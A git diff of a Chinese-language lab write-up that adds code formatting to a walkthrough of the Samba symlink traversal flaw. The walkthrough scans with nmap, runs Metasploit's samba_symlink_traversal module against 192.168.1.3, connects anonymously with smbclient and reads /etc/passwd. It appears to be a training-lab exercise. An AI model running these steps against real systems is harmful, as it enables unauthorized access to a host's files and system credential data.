@@ -12,33 +12,33 @@ tags: sysmlink msf
 
 ### 过程：
 
-使用nmap -sV ip 扫描主机，确认开放445，139端口且安装了samba服务，版本为3
+使用`nmap -sV ip` 扫描主机，确认开放`445`，`139`端口且安装了`samba`服务，版本为3
 
 ![image-20211220165606561](https://gitee.com/oxchang/img-host/raw/master/sysmlink漏洞/image-20211220165606561.png)
 
-命令行输入search samba，搜索samba的相关工具和载荷。
+命令行输入`search samba`，搜索samba的相关工具和载荷。
 
 ![image-20211220173445099](https://gitee.com/oxchang/img-host/raw/master/sysmlink漏洞/image-20211220173445099.png)
 
-终端中输入use auxiliary/admin/smb/samba_symlink_traversal，启用漏洞利用模块
+终端中输入`use auxiliary/admin/smb/samba_symlink_traversal`，启用漏洞利用模块
 
-输入info，”yes”表示必须要填写的信息
+输入`info`，`"yes"`表示必须要填写的信息
 
 ![image-20211220173527544](https://gitee.com/oxchang/img-host/raw/master/sysmlink漏洞/image-20211220173527544.png)
 
-输入set RHOST 192.168.1.3和set SMBSHARE tmp，设置主机ip地址和SAM可写文件
+输入`set RHOST 192.168.1.3`和`set SMBSHARE tmp`，设置主机ip地址和SAM可写文件
 
 输入exploit开始攻击
 
 ![image-20211220173602852](https://gitee.com/oxchang/img-host/raw/master/sysmlink漏洞/image-20211220173602852.png)
 
-新建终端，输入smbclient //192.168.1.3/tmp，直接回车，无密码
+新建终端，输入`smbclient //192.168.1.3/tmp`，直接回车，无密码
 
-输入cd rootfs,进入rootfs目录，输入ls，列出目录
+输入`cd rootfs`,进入rootfs目录，输入ls，列出目录
 
 ![image-20211220173635907](https://gitee.com/oxchang/img-host/raw/master/sysmlink漏洞/image-20211220173635907.png)
 
-输入more /etc/passwd
+输入`more /etc/passwd`
 
 ![image-20211220173656794](https://gitee.com/oxchang/img-host/raw/master/sysmlink漏洞/image-20211220173656794-16399930170041.png)
 
